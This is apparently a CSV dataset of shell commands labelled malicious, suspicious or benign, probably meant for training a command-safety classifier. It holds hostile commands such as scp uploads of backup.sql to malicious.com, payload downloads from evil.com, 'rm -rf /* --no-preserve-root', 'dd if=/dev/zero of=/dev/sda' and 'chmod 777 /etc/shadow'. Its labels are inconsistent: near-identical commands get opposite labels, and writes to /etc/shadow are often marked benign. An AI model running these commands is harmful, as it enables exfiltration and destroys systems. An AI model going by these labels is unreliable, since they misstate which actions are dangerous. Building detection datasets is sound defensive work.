command,label
ECHO 'PWNED' >> /VAR/LOG/SYSLOG,MALICIOUS
ECHO 'PWNED' >   /VAR/LOG/SYSLOG,MALICIOUS
CAT README.MD ,BENIGN
echo 'owned'   > /root/.bashrc,BENIGN
 ECHO 'HACKED' >> /ETC/SHADOW,BENIGN
SUDO SU ,SUSPICIOUS
scp file.txt root@malicious.com:/root/ ,MALICIOUS
SUDO APT UPDATE ,BENIGN
SUDO APT INSTALL NET-TOOLS ,MALICIOUS
ECHO 'PWNED' >> /ROOT/.BASHRC,BENIGN
ECHO 'OWNED' >> /ETC/SHADOW,MALICIOUS
scp backup.sql admin@malicious.com:/root/,MALICIOUS
echo 'owned'   > /etc/shadow,SUSPICIOUS
ECHO 'HACKED' >> /ETC/SHADOW,SUSPICIOUS
 CAT /HOME/USER/INFO.TXT,BENIGN
SCP BACKUP.SQL ADMIN@BACKUP.SERVER:/ROOT/,MALICIOUS
 CURL HTTPS://EVIL.COM/PAYLOAD.SH,BENIGN
ECHO 'PWNED'   >> /ROOT/.BASHRC,MALICIOUS
SUDO APT   INSTALL HTOP,MALICIOUS
SCP   FILE.TXT ROOT@MALICIOUS.COM:/TMP/,MALICIOUS
 curl -O http://suspicious.org/payload.sh,BENIGN
curl -O http://suspicious.org/update.bin ,BENIGN
 CD /ROOT,SUSPICIOUS
CURL -O   HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,BENIGN
 echo 'pwned' > /var/log/syslog,SUSPICIOUS
CURL   HTTPS://SUSPICIOUS.ORG/PAYLOAD.SH,BENIGN
scp backup.sql   root@malicious.com:/root/,SUSPICIOUS
CAT ~/.SSH/KNOWN_HOSTS ,SUSPICIOUS
WGET   HTTP://SUSPICIOUS.ORG/UPDATE.BIN,SUSPICIOUS
scp   backup.sql root@backup.server:/root/,BENIGN
WGET HTTP://MALICIOUS.COM/PAYLOAD.SH ,MALICIOUS
ECHO   'HACKED' > /VAR/LOG/SYSLOG,SUSPICIOUS
scp backup.sql   admin@backup.server:/tmp/,BENIGN
 ECHO 'OWNED' > /ETC/SHADOW,SUSPICIOUS
ECHO 'MALWARE' >   /TMP/MALWARE.SH,MALICIOUS
scp   backup.sql user@192.168.0.2:/root/,SUSPICIOUS
scp   file.txt admin@malicious.com:/root/,MALICIOUS
scp file.txt   user@192.168.0.2:/root/,MALICIOUS
ECHO 'PWNED'   >> /ETC/SHADOW,SUSPICIOUS
curl -o   http://fileshare.com/update.bin,SUSPICIOUS
 WGET HTTP://FILESHARE.COM/EXPLOIT.ZIP,SUSPICIOUS
ECHO   'PWNED' >> /ETC/SHADOW,MALICIOUS
curl   -o http://suspicious.org/update.bin,SUSPICIOUS
RM   -RF /VAR/,MALICIOUS
 SUDO APT UPDATE,BENIGN
scp backup.sql root@192.168.0.2:/tmp/,BENIGN
echo 'pwned' >> /root/.bashrc ,SUSPICIOUS
SCP   BACKUP.SQL ROOT@BACKUP.SERVER:/TMP/,SUSPICIOUS
echo 'hacked' >>   /root/.bashrc,SUSPICIOUS
 scp backup.sql user@192.168.0.2:/tmp/,SUSPICIOUS
scp   data.tar.gz user@192.168.0.2:/tmp/,MALICIOUS
PS AUX |   GREP MYSQL,MALICIOUS
scp   file.txt admin@backup.server:/tmp/,MALICIOUS
echo 'hacked'   > /etc/shadow,MALICIOUS
 RM -RF /HOME/USER,MALICIOUS
ECHO 'PWNED'   > /ETC/SHADOW,BENIGN
echo 'hacked' >> /var/log/syslog ,SUSPICIOUS
wget http://suspicious.org/update.bin ,MALICIOUS
scp backup.sql root@192.168.0.2:/root/ ,MALICIOUS
 scp file.txt user@192.168.0.2:/var/www,SUSPICIOUS
CURL HTTPS://EVIL.COM/UPDATE.BIN ,BENIGN
 curl -O http://evil.com/payload.sh,MALICIOUS
 WGET HTTP://FILESHARE.COM/UPDATE.BIN,BENIGN
 scp data.tar.gz admin@backup.server:/var/www,BENIGN
SCP BACKUP.SQL USER@192.168.0.2:/ROOT/,SUSPICIOUS
PWD ,BENIGN
scp backup.sql admin@192.168.0.2:/var/www ,BENIGN
CURL   -O HTTP://FILESHARE.COM/PAYLOAD.SH,MALICIOUS
 scp backup.sql root@malicious.com:/tmp/,BENIGN
SCP FILE.TXT ADMIN@192.168.0.2:/ROOT/,SUSPICIOUS
scp   backup.sql root@192.168.0.2:/tmp/,MALICIOUS
SCP FILE.TXT   ADMIN@192.168.0.2:/VAR/WWW,MALICIOUS
scp data.tar.gz   root@malicious.com:/root/,MALICIOUS
CHMOD 777 /ETC/SHADOW ,MALICIOUS
SCP BACKUP.SQL ROOT@192.168.0.2:/TMP/,BENIGN
 scp file.txt admin@backup.server:/root/,SUSPICIOUS
scp file.txt   user@malicious.com:/tmp/,BENIGN
ECHO 'PWNED'   > /VAR/LOG/SYSLOG,BENIGN
SSH   -L 8080:TARGET.COM:80 ATTACKER@REMOTE,MALICIOUS
SCP FILE.TXT   ATTACKER@REMOTE:/TMP/,MALICIOUS
 CHMOD 777 /ETC/SHADOW,MALICIOUS
wget http://suspicious.org/exploit.zip ,BENIGN
ECHO 'PWNED'   > /ROOT/.BASHRC,BENIGN
CURL -O HTTP://SUSPICIOUS.ORG/UPDATE.BIN ,MALICIOUS
CHMOD 777   /ROOT/.BASHRC,BENIGN
ECHO 'HACKED' >   /ETC/SHADOW,BENIGN
PS   AUX | GREP MYSQL,MALICIOUS
curl -o http://evil.com/exploit.zip,MALICIOUS
CD /TMP/ ,BENIGN
scp data.tar.gz   user@backup.server:/tmp/,SUSPICIOUS
ECHO 'OWNED' > /VAR/LOG/SYSLOG ,MALICIOUS
ECHO 'OWNED' > /ETC/SHADOW,MALICIOUS
 scp file.txt user@backup.server:/var/www,SUSPICIOUS
SCP DATA.TAR.GZ   ADMIN@MALICIOUS.COM:/ROOT/,BENIGN
 CD /ROOT/,BENIGN
scp   data.tar.gz user@backup.server:/root/,BENIGN
curl   -o http://evil.com/update.bin,SUSPICIOUS
WGET HTTP://FILESHARE.COM/PAYLOAD.SH ,MALICIOUS
CURL HTTPS://SUSPICIOUS.ORG/EXPLOIT.ZIP,MALICIOUS
 scp data.tar.gz root@malicious.com:/root/,MALICIOUS
CURL   HTTPS://EVIL.COM/PAYLOAD.SH,BENIGN
echo 'owned' >> /var/log/syslog ,SUSPICIOUS
ECHO 'OWNED' > /ETC/SHADOW ,MALICIOUS
scp file.txt root@backup.server:/var/www ,SUSPICIOUS
 scp data.tar.gz user@malicious.com:/tmp/,SUSPICIOUS
SCP BACKUP.SQL USER@BACKUP.SERVER:/ROOT/,SUSPICIOUS
echo 'owned' >> /etc/shadow ,BENIGN
 scp backup.sql root@backup.server:/tmp/,MALICIOUS
CURL   -O HTTP://EVIL.COM/EXPLOIT.ZIP,SUSPICIOUS
CHMOD 777 /VAR/LOG/SYSLOG ,BENIGN
CURL -O HTTP://FILESHARE.COM/UPDATE.BIN ,BENIGN
SCP DATA.TAR.GZ ROOT@MALICIOUS.COM:/ROOT/ ,MALICIOUS
SCP DATA.TAR.GZ ROOT@192.168.0.2:/ROOT/,BENIGN
 curl -o http://evil.com/update.bin,SUSPICIOUS
scp file.txt user@192.168.0.2:/tmp/ ,MALICIOUS
PS AUX | GREP   SSHD,SUSPICIOUS
scp   file.txt root@backup.server:/root/,MALICIOUS
SCP FILE.TXT USER@192.168.0.2:/ROOT/,BENIGN
PS AUX | GREP SSHD ,SUSPICIOUS
 ECHO 'PWNED' > /ROOT/.BASHRC,MALICIOUS
ECHO 'OWNED' >> /VAR/LOG/SYSLOG ,BENIGN
PS AUX |   GREP SSHD,SUSPICIOUS
CURL HTTPS://SUSPICIOUS.ORG/PAYLOAD.SH ,BENIGN
SCP DATA.TAR.GZ ADMIN@MALICIOUS.COM:/ROOT/,MALICIOUS
curl -O http://suspicious.org/payload.sh ,BENIGN
SCP FILE.TXT USER@BACKUP.SERVER:/TMP/ ,MALICIOUS
MKDIR TEST ,BENIGN
curl   -o http://fileshare.com/update.bin,MALICIOUS
scp data.tar.gz   root@backup.server:/var/www,SUSPICIOUS
scp   file.txt user@malicious.com:/tmp/,MALICIOUS
scp   data.tar.gz admin@backup.server:/tmp/,MALICIOUS
scp data.tar.gz admin@192.168.0.2:/tmp/ ,BENIGN
echo 'owned' >>   /root/.bashrc,MALICIOUS
curl   -o http://fileshare.com/exploit.zip,SUSPICIOUS
IPTABLES -F ,MALICIOUS
ECHO 'HACKED' >   /VAR/LOG/SYSLOG,SUSPICIOUS
SCP DATA.TAR.GZ USER@BACKUP.SERVER:/ROOT/,BENIGN
scp file.txt   admin@backup.server:/root/,SUSPICIOUS
 WGET HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,MALICIOUS
scp   backup.sql root@backup.server:/tmp/,MALICIOUS
 GREP ROOT /ETC/PASSWD,SUSPICIOUS
ECHO 'HELLO' ,BENIGN
CURL HTTPS://EVIL.COM/PAYLOAD.SH,SUSPICIOUS
ECHO 'PWNED' >   /ETC/SHADOW,SUSPICIOUS
SCP BACKUP.SQL ADMIN@192.168.0.2:/TMP/ ,BENIGN
scp data.tar.gz admin@backup.server:/tmp/ ,BENIGN
CURL HTTPS://EVIL.COM/EXPLOIT.ZIP ,BENIGN
ECHO 'OWNED'   > /VAR/LOG/SYSLOG,BENIGN
SCP   BACKUP.SQL ROOT@MALICIOUS.COM:/ROOT/,SUSPICIOUS
 SCP FILE.TXT ATTACKER@REMOTE:/TMP/,MALICIOUS
echo 'hacked' >   /etc/shadow,MALICIOUS
scp   data.tar.gz user@192.168.0.2:/var/www,MALICIOUS
 scp backup.sql root@backup.server:/root/,MALICIOUS
scp file.txt   root@backup.server:/tmp/,SUSPICIOUS
scp backup.sql root@backup.server:/tmp/ ,BENIGN
wget http://evil.com/exploit.zip ,SUSPICIOUS
WHICH PYTHON ,SUSPICIOUS
SCP   DATA.TAR.GZ ROOT@BACKUP.SERVER:/TMP/,BENIGN
 scp data.tar.gz root@backup.server:/tmp/,MALICIOUS
ECHO 'PWNED' >>   /ROOT/.BASHRC,SUSPICIOUS
scp backup.sql user@backup.server:/tmp/ ,MALICIOUS
scp file.txt admin@malicious.com:/tmp/ ,BENIGN
 ECHO 'PWNED' >> /ROOT/.BASHRC,MALICIOUS
ECHO   'PWNED' > /ETC/SHADOW,BENIGN
CURL -O HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP ,SUSPICIOUS
scp data.tar.gz admin@backup.server:/root/ ,BENIGN
scp   file.txt admin@backup.server:/root/,SUSPICIOUS
 SCP BACKUP.SQL ROOT@192.168.0.2:/VAR/WWW,SUSPICIOUS
SCP BACKUP.SQL USER@192.168.0.2:/ROOT/ ,MALICIOUS
SCP DATA.TAR.GZ USER@MALICIOUS.COM:/TMP/,SUSPICIOUS
WGET HTTP://FILESHARE.COM/UPDATE.BIN ,SUSPICIOUS
scp file.txt   admin@192.168.0.2:/var/www,BENIGN
 LS /TMP/,MALICIOUS
SCP   FILE.TXT ROOT@BACKUP.SERVER:/TMP/,BENIGN
ECHO 'PWNED' >   /ROOT/.BASHRC,BENIGN
SCP BACKUP.SQL ROOT@MALICIOUS.COM:/ROOT/,MALICIOUS
ECHO 'OWNED'   >> /ROOT/.BASHRC,BENIGN
scp data.tar.gz root@malicious.com:/root/ ,BENIGN
SCP   BACKUP.SQL ADMIN@MALICIOUS.COM:/ROOT/,SUSPICIOUS
 NETSTAT -TULNP,SUSPICIOUS
 ECHO 'PWNED' >> /VAR/LOG/SYSLOG,MALICIOUS
SCP   DATA.TAR.GZ ADMIN@MALICIOUS.COM:/ROOT/,BENIGN
SCP DATA.TAR.GZ ROOT@BACKUP.SERVER:/VAR/WWW,MALICIOUS
 scp backup.sql root@backup.server:/var/www,SUSPICIOUS
scp file.txt   admin@192.168.0.2:/tmp/,MALICIOUS
scp data.tar.gz   root@192.168.0.2:/root/,BENIGN
 scp file.txt admin@backup.server:/tmp/,SUSPICIOUS
echo 'hacked' > /var/log/syslog ,BENIGN
CURL HTTPS://SUSPICIOUS.ORG/EXPLOIT.ZIP ,SUSPICIOUS
CURL -O HTTP://SUSPICIOUS.ORG/PAYLOAD.SH ,SUSPICIOUS
DD IF=/DEV/ZERO OF=/DEV/SDA ,MALICIOUS
scp   backup.sql root@malicious.com:/tmp/,MALICIOUS
scp backup.sql root@malicious.com:/tmp/ ,BENIGN
scp backup.sql admin@malicious.com:/var/www ,SUSPICIOUS
scp backup.sql   user@192.168.0.2:/tmp/,MALICIOUS
 PS AUX,SUSPICIOUS
CURL   HTTPS://FILESHARE.COM/EXPLOIT.ZIP,BENIGN
CURL   -O HTTP://EVIL.COM/UPDATE.BIN,BENIGN
 SUDO APT INSTALL HTOP,BENIGN
scp data.tar.gz   user@192.168.0.2:/var/www,SUSPICIOUS
scp backup.sql   root@192.168.0.2:/var/www,BENIGN
 WGET HTTP://EVIL.COM/UPDATE.BIN,BENIGN
 CURL -O HTTP://FILESHARE.COM/UPDATE.BIN,SUSPICIOUS
SCP DATA.TAR.GZ ADMIN@192.168.0.2:/VAR/WWW,BENIGN
 SCP BACKUP.SQL ADMIN@MALICIOUS.COM:/TMP/,SUSPICIOUS
scp file.txt   root@malicious.com:/root/,MALICIOUS
SCP FILE.TXT ADMIN@BACKUP.SERVER:/TMP/,MALICIOUS
CURL HTTPS://SUSPICIOUS.ORG/UPDATE.BIN ,BENIGN
scp file.txt admin@backup.server:/tmp/ ,SUSPICIOUS
 ECHO 'PWNED' > /VAR/LOG/SYSLOG,SUSPICIOUS
CD /VAR/WWW ,MALICIOUS
PS AUX   | GREP MYSQL,MALICIOUS
curl -o http://evil.com/update.bin ,MALICIOUS
SCP DATA.TAR.GZ USER@192.168.0.2:/ROOT/,BENIGN
 CURL HTTPS://FILESHARE.COM/PAYLOAD.SH,BENIGN
curl -o http://fileshare.com/update.bin ,MALICIOUS
 WGET HTTP://FILESHARE.COM/PAYLOAD.SH,SUSPICIOUS
 TOUCH HOMEWORK.DOC,BENIGN
scp   backup.sql root@malicious.com:/root/,BENIGN
 echo 'hacked' >> /root/.bashrc,BENIGN
ECHO 'PWNED' > /ETC/SHADOW,SUSPICIOUS
ECHO   'OWNED' >> /ROOT/.BASHRC,BENIGN
scp   data.tar.gz root@backup.server:/root/,MALICIOUS
scp   backup.sql user@backup.server:/root/,MALICIOUS
curl -o http://suspicious.org/update.bin ,MALICIOUS
CURL -O   HTTP://EVIL.COM/UPDATE.BIN,BENIGN
 CAT NOTES.TXT,BENIGN
echo 'owned' >>   /var/log/syslog,BENIGN
scp data.tar.gz root@malicious.com:/var/www ,MALICIOUS
PS   AUX | GREP NGINX,MALICIOUS
scp   file.txt user@backup.server:/var/www,BENIGN
WGET HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP ,SUSPICIOUS
scp data.tar.gz   root@192.168.0.2:/var/www,SUSPICIOUS
scp   data.tar.gz root@malicious.com:/tmp/,BENIGN
curl -o   http://suspicious.org/update.bin,MALICIOUS
 CAT .BASHRC,BENIGN
 curl -o http://suspicious.org/payload.sh,SUSPICIOUS
 CURL HTTPS://EVIL.COM/EXPLOIT.ZIP,BENIGN
scp   backup.sql user@malicious.com:/tmp/,BENIGN
SCP BACKUP.SQL USER@BACKUP.SERVER:/VAR/WWW,SUSPICIOUS
scp file.txt   user@malicious.com:/var/www,MALICIOUS
scp   file.txt root@backup.server:/tmp/,SUSPICIOUS
scp backup.sql admin@192.168.0.2:/root/ ,BENIGN
scp data.tar.gz   root@malicious.com:/var/www,MALICIOUS
 scp data.tar.gz root@malicious.com:/tmp/,MALICIOUS
SCP DATA.TAR.GZ ROOT@MALICIOUS.COM:/ROOT/,SUSPICIOUS
 scp backup.sql admin@malicious.com:/tmp/,BENIGN
 scp file.txt admin@malicious.com:/var/www,BENIGN
scp file.txt   admin@192.168.0.2:/root/,BENIGN
echo 'pwned' >> /var/log/syslog ,MALICIOUS
RM -RF   /* --NO-PRESERVE-ROOT,MALICIOUS
scp data.tar.gz   user@192.168.0.2:/tmp/,SUSPICIOUS
scp   backup.sql admin@192.168.0.2:/var/www,SUSPICIOUS
CURL -O HTTP://EVIL.COM/PAYLOAD.SH ,BENIGN
 CURL -O HTTP://SUSPICIOUS.ORG/UPDATE.BIN,BENIGN
 ECHO 'PWNED' > /ETC/SHADOW,BENIGN
 CURL HTTPS://SUSPICIOUS.ORG/UPDATE.BIN,SUSPICIOUS
ECHO   'OWNED' > /ETC/SHADOW,MALICIOUS
SCP DATA.TAR.GZ USER@192.168.0.2:/TMP/,MALICIOUS
 RM -RF /VAR/,MALICIOUS
 CURL HTTPS://FILESHARE.COM/EXPLOIT.ZIP,SUSPICIOUS
scp backup.sql   admin@backup.server:/root/,SUSPICIOUS
ECHO 'OWNED' >> /ROOT/.BASHRC ,SUSPICIOUS
scp data.tar.gz   admin@malicious.com:/tmp/,MALICIOUS
SCP FILE.TXT ROOT@192.168.0.2:/VAR/WWW,BENIGN
SCP BACKUP.SQL ROOT@MALICIOUS.COM:/TMP/,MALICIOUS
 scp file.txt root@192.168.0.2:/tmp/,SUSPICIOUS
SCP FILE.TXT USER@192.168.0.2:/TMP/,MALICIOUS
 ECHO 'HELLO',BENIGN
 scp backup.sql admin@backup.server:/var/www,SUSPICIOUS
scp   data.tar.gz admin@backup.server:/var/www,BENIGN
ECHO 'OWNED' > /ROOT/.BASHRC ,BENIGN
SCP DATA.TAR.GZ ROOT@192.168.0.2:/VAR/WWW,MALICIOUS
scp data.tar.gz admin@backup.server:/var/www ,MALICIOUS
scp   backup.sql user@backup.server:/var/www,MALICIOUS
curl   -o http://suspicious.org/payload.sh,BENIGN
 CURL HTTPS://FILESHARE.COM/UPDATE.BIN,MALICIOUS
ECHO   'HACKED' >> /VAR/LOG/SYSLOG,SUSPICIOUS
 scp data.tar.gz root@192.168.0.2:/root/,MALICIOUS
scp backup.sql   root@malicious.com:/var/www,BENIGN
SCP FILE.TXT ROOT@BACKUP.SERVER:/VAR/WWW,SUSPICIOUS
PS AUX | GREP   MYSQL,BENIGN
ECHO 'HACKED'   > /VAR/LOG/SYSLOG,BENIGN
SCP DATA.TAR.GZ ADMIN@BACKUP.SERVER:/VAR/WWW,BENIGN
scp file.txt admin@malicious.com:/root/ ,BENIGN
 scp data.tar.gz admin@192.168.0.2:/root/,MALICIOUS
scp data.tar.gz   admin@192.168.0.2:/root/,BENIGN
scp   file.txt root@malicious.com:/var/www,BENIGN
SCP FILE.TXT USER@MALICIOUS.COM:/TMP/,BENIGN
CURL -O HTTP://FILESHARE.COM/PAYLOAD.SH ,MALICIOUS
scp   backup.sql root@192.168.0.2:/root/,SUSPICIOUS
scp data.tar.gz user@backup.server:/root/ ,BENIGN
 scp backup.sql user@malicious.com:/tmp/,MALICIOUS
scp backup.sql user@192.168.0.2:/var/www ,MALICIOUS
scp   file.txt root@backup.server:/var/www,SUSPICIOUS
 scp file.txt admin@malicious.com:/root/,MALICIOUS
SSH -L   8080:TARGET.COM:80 ATTACKER@REMOTE,MALICIOUS
 scp file.txt user@backup.server:/tmp/,SUSPICIOUS
SCP   DATA.TAR.GZ USER@192.168.0.2:/ROOT/,MALICIOUS
SCP DATA.TAR.GZ ROOT@BACKUP.SERVER:/TMP/,BENIGN
SCP DATA.TAR.GZ   ADMIN@MALICIOUS.COM:/VAR/WWW,BENIGN
scp   file.txt user@192.168.0.2:/var/www,SUSPICIOUS
SCP   FILE.TXT USER@BACKUP.SERVER:/TMP/,BENIGN
CURL -O   HTTP://FILESHARE.COM/EXPLOIT.ZIP,MALICIOUS
RM -RF /HOME/USER ,SUSPICIOUS
ECHO 'OWNED' >> /ETC/SHADOW ,BENIGN
scp file.txt admin@192.168.0.2:/root/ ,MALICIOUS
SCP   FILE.TXT USER@MALICIOUS.COM:/TMP/,BENIGN
 WGET HTTP://EVIL.COM/PAYLOAD.SH,BENIGN
SCP FILE.TXT ROOT@BACKUP.SERVER:/TMP/,MALICIOUS
scp file.txt root@backup.server:/tmp/ ,MALICIOUS
SCP BACKUP.SQL USER@BACKUP.SERVER:/TMP/,MALICIOUS
scp data.tar.gz   admin@192.168.0.2:/tmp/,BENIGN
SCP DATA.TAR.GZ ROOT@MALICIOUS.COM:/VAR/WWW,MALICIOUS
SCP FILE.TXT USER@192.168.0.2:/TMP/ ,BENIGN
 ECHO 'OWNED' >> /ETC/SHADOW,SUSPICIOUS
ECHO   'HACKED' >> /ROOT/.BASHRC,SUSPICIOUS
SCP FILE.TXT   ROOT@MALICIOUS.COM:/ROOT/,SUSPICIOUS
scp backup.sql   user@192.168.0.2:/var/www,BENIGN
SCP BACKUP.SQL ADMIN@192.168.0.2:/VAR/WWW,BENIGN
scp   file.txt user@192.168.0.2:/tmp/,MALICIOUS
PS AUX | GREP   NGINX,MALICIOUS
scp data.tar.gz   user@backup.server:/root/,SUSPICIOUS
scp backup.sql   admin@192.168.0.2:/root/,MALICIOUS
SCP BACKUP.SQL USER@MALICIOUS.COM:/VAR/WWW,BENIGN
SCP FILE.TXT   USER@BACKUP.SERVER:/TMP/,MALICIOUS
scp backup.sql user@backup.server:/var/www ,BENIGN
SCP FILE.TXT   ADMIN@BACKUP.SERVER:/ROOT/,BENIGN
SCP FILE.TXT ADMIN@192.168.0.2:/VAR/WWW,MALICIOUS
scp backup.sql   admin@malicious.com:/root/,MALICIOUS
SCP FILE.TXT ROOT@192.168.0.2:/TMP/,SUSPICIOUS
 scp data.tar.gz user@192.168.0.2:/tmp/,BENIGN
scp data.tar.gz   user@backup.server:/var/www,SUSPICIOUS
scp   backup.sql user@192.168.0.2:/tmp/,MALICIOUS
 scp backup.sql admin@malicious.com:/root/,SUSPICIOUS
CURL HTTPS://FILESHARE.COM/UPDATE.BIN ,MALICIOUS
 scp backup.sql root@malicious.com:/var/www,MALICIOUS
 curl -o http://suspicious.org/update.bin,SUSPICIOUS
scp   data.tar.gz admin@192.168.0.2:/tmp/,SUSPICIOUS
ECHO 'OWNED' >>   /ROOT/.BASHRC,SUSPICIOUS
 curl -o http://fileshare.com/payload.sh,SUSPICIOUS
WGET HTTP://EVIL.COM/EXPLOIT.ZIP ,BENIGN
scp   file.txt user@malicious.com:/root/,MALICIOUS
 scp data.tar.gz user@malicious.com:/root/,SUSPICIOUS
scp file.txt user@malicious.com:/tmp/ ,BENIGN
CURL   -O HTTP://FILESHARE.COM/UPDATE.BIN,MALICIOUS
scp data.tar.gz admin@192.168.0.2:/root/ ,BENIGN
 scp file.txt root@192.168.0.2:/var/www,BENIGN
scp backup.sql root@192.168.0.2:/var/www ,MALICIOUS
curl -o http://suspicious.org/payload.sh ,BENIGN
scp data.tar.gz   admin@backup.server:/var/www,MALICIOUS
FIND   / -NAME 'TEST',BENIGN
SCP DATA.TAR.GZ ROOT@MALICIOUS.COM:/TMP/ ,MALICIOUS
 ECHO 'HACKED' >> /ROOT/.BASHRC,SUSPICIOUS
ECHO 'OWNED'   >> /VAR/LOG/SYSLOG,SUSPICIOUS
curl   -o http://evil.com/exploit.zip,MALICIOUS
scp backup.sql root@backup.server:/var/www ,BENIGN
SCP BACKUP.SQL   ADMIN@MALICIOUS.COM:/ROOT/,SUSPICIOUS
 SCP BACKUP.SQL USER@MALICIOUS.COM:/TMP/,MALICIOUS
ECHO   'OWNED' > /ROOT/.BASHRC,SUSPICIOUS
scp   file.txt admin@malicious.com:/tmp/,BENIGN
CURL -O   HTTP://SUSPICIOUS.ORG/UPDATE.BIN,SUSPICIOUS
scp file.txt   user@malicious.com:/root/,SUSPICIOUS
SCP BACKUP.SQL ROOT@BACKUP.SERVER:/VAR/WWW ,SUSPICIOUS
 ECHO 'HACKED' > /VAR/LOG/SYSLOG,BENIGN
scp data.tar.gz   root@malicious.com:/tmp/,SUSPICIOUS
SCP   DATA.TAR.GZ ROOT@MALICIOUS.COM:/TMP/,MALICIOUS
CURL   HTTPS://FILESHARE.COM/PAYLOAD.SH,SUSPICIOUS
 scp data.tar.gz root@backup.server:/var/www,SUSPICIOUS
scp file.txt   root@192.168.0.2:/var/www,BENIGN
 scp backup.sql root@192.168.0.2:/var/www,BENIGN
scp   backup.sql user@malicious.com:/root/,MALICIOUS
SCP FILE.TXT ADMIN@BACKUP.SERVER:/VAR/WWW,MALICIOUS
 scp file.txt user@malicious.com:/var/www,BENIGN
 scp data.tar.gz admin@192.168.0.2:/var/www,SUSPICIOUS
SCP DATA.TAR.GZ ROOT@192.168.0.2:/ROOT/ ,MALICIOUS
SCP DATA.TAR.GZ ADMIN@MALICIOUS.COM:/TMP/ ,SUSPICIOUS
SCP FILE.TXT   USER@MALICIOUS.COM:/TMP/,SUSPICIOUS
SCP   FILE.TXT ADMIN@BACKUP.SERVER:/TMP/,MALICIOUS
 scp data.tar.gz admin@backup.server:/tmp/,BENIGN
scp file.txt   user@backup.server:/var/www,MALICIOUS
SCP FILE.TXT   ROOT@BACKUP.SERVER:/ROOT/,BENIGN
SCP FILE.TXT USER@BACKUP.SERVER:/ROOT/ ,MALICIOUS
scp file.txt admin@192.168.0.2:/tmp/ ,BENIGN
scp file.txt   admin@backup.server:/tmp/,SUSPICIOUS
ECHO 'HACKED'   >> /VAR/LOG/SYSLOG,BENIGN
SCP   FILE.TXT USER@BACKUP.SERVER:/ROOT/,SUSPICIOUS
scp file.txt   user@backup.server:/root/,BENIGN
 scp data.tar.gz admin@malicious.com:/root/,BENIGN
scp data.tar.gz root@backup.server:/var/www ,SUSPICIOUS
ECHO 'PWNED' > /ROOT/.BASHRC ,SUSPICIOUS
scp   file.txt root@192.168.0.2:/tmp/,MALICIOUS
scp file.txt root@malicious.com:/var/www ,MALICIOUS
ECHO 'PWNED' >> /ROOT/.BASHRC ,MALICIOUS
 scp backup.sql admin@malicious.com:/var/www,MALICIOUS
scp backup.sql   user@192.168.0.2:/root/,SUSPICIOUS
 scp backup.sql root@192.168.0.2:/root/,BENIGN
SCP DATA.TAR.GZ ADMIN@192.168.0.2:/TMP/,MALICIOUS
SCP   BACKUP.SQL ADMIN@192.168.0.2:/TMP/,SUSPICIOUS
SCP BACKUP.SQL   USER@192.168.0.2:/VAR/WWW,MALICIOUS
 ECHO 'PWNED' >> /ETC/SHADOW,SUSPICIOUS
SCP BACKUP.SQL ADMIN@BACKUP.SERVER:/VAR/WWW,MALICIOUS
curl -o   http://evil.com/exploit.zip,BENIGN
 scp file.txt root@malicious.com:/var/www,SUSPICIOUS
CURL -O   HTTP://SUSPICIOUS.ORG/PAYLOAD.SH,MALICIOUS
scp   backup.sql admin@backup.server:/var/www,SUSPICIOUS
SCP DATA.TAR.GZ   ADMIN@192.168.0.2:/TMP/,SUSPICIOUS
scp   file.txt admin@192.168.0.2:/tmp/,MALICIOUS
scp   file.txt root@192.168.0.2:/var/www,BENIGN
CHMOD 777 /ROOT/.BASHRC ,BENIGN
 scp file.txt root@malicious.com:/tmp/,BENIGN
SCP BACKUP.SQL ROOT@MALICIOUS.COM:/VAR/WWW,SUSPICIOUS
scp backup.sql admin@backup.server:/tmp/ ,MALICIOUS
 scp data.tar.gz user@backup.server:/tmp/,SUSPICIOUS
ECHO 'HACKED' >> /ROOT/.BASHRC ,BENIGN
curl -o http://fileshare.com/payload.sh ,SUSPICIOUS
CURL -O   HTTP://FILESHARE.COM/PAYLOAD.SH,BENIGN
SCP BACKUP.SQL ROOT@MALICIOUS.COM:/VAR/WWW ,SUSPICIOUS
SCP DATA.TAR.GZ ADMIN@BACKUP.SERVER:/TMP/,SUSPICIOUS
 scp file.txt root@backup.server:/var/www,BENIGN
scp backup.sql admin@malicious.com:/tmp/ ,BENIGN
ECHO 'OWNED'   > /ROOT/.BASHRC,SUSPICIOUS
 scp backup.sql user@backup.server:/tmp/,MALICIOUS
PS   AUX | GREP SSHD,MALICIOUS
SCP BACKUP.SQL ADMIN@MALICIOUS.COM:/VAR/WWW,MALICIOUS
